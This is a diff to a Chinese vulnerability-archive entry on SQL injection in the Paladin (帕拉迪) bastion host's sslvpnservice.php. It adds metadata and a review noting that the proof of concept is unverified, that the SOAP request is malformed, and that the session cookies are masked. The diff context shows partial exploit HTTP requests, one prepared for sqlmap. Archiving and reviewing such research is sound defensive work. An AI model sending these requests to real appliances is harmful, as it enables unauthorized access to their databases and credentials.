@@ -1,8 +1,57 @@
 ---
 source: "MrWQ/vulnerability-paper"
+id: "vw-90c206a154b1d1550dc6bf2d"
+entity_id: "ve-90c206a154b1d1550dc6bf2d"
+schema_version: "1"
+title: "帕拉迪堡垒机 (某些版本)sql 注入"
+product: "帕拉迪堡垒机"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+prerequisites: "约ST00001B105至B109前部分版本未完整测试；token按服务端日期生成，需存在user"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%B8%95%E6%8B%89%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA/%E5%B8%95%E6%8B%89%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA%20%28%E6%9F%90%E4%BA%9B%E7%89%88%E6%9C%AC%29sql%20%E6%B3%A8%E5%85%A5.md"
+review_date: "2026-10-02"
+side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
+source_url: "https://mp.weixin.qq.com/s/vllWjQIXB7vQR0IjUgXpww"
+source_status: "recorded"
 ---
 
 # 帕拉迪堡垒机 (某些版本)sql 注入
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：帕拉迪堡垒机
+- 本文讨论：sslvpnservice.php getAccountDetail user/acctid注入与预测token
+- 版本、权限与配置前提：约ST00001B105至B109前部分版本未完整测试；token按服务端日期生成，需存在user
+- 资料类型：堡垒机SQL源码与认证链研究；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- token不是完全常量，代码含Ymd日期，固定示例值不能跨日期复用
+- SOAP使用SOAP-ENV前缀却声明SOAPENV，未绑定前缀；JSON字符串中硬换行和UA断行损坏请求
+- 查询密保答案再重置是独立业务条件，读取答案不自动证明只需一个答案
+- 作者承认版本不确定应保留，不能改成整段已验证范围
+- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
+
+### 操作风险与恢复
+
+- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本
+
+### 待核与来源
+
+- 正式版本范围、鉴权Cookie必要性、token时区与截图待核
+- 引用图片未查看，截图内容及有效性待核验
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vllWjQIXB7vQR0IjUgXpww)
@@ -45,13 +94,13 @@ function getAccountDetail($data)
 
 由于 token 硬编码，所以可以进入 if 导致 sql 注入，构造数据包如下：  
 
-```
+```http
 POST /sslvpnservice.php HTTP/1.1
 Host: xxxx
 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
 like Gecko) Chrome/89.0.4389.90 Safari/537.36
 Connection: close
-Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
+Cookie: PHPSESSID=8fd********************872; think_language=zh-cn
 Content-Type: text/xml
 Content-Length: 580
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -72,13 +121,13 @@ xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://sche
 
 我们构造 sqlmap 方便注入的数据包：
 
-```
+```http
 POST /sslvpnservice.php HTTP/1.1
 Host: xxxx
 Connection: close
 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
 like Gecko) Chrome/89.0.4389.90 Safari/537.36
-Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
+Cookie: PHPSESSID=8fd********************872; think_language=zh-cn
 Content-Type: text/xml
 Content-Length: 580
 <?xml version="1.0" encoding="ISO-8859-1"?>
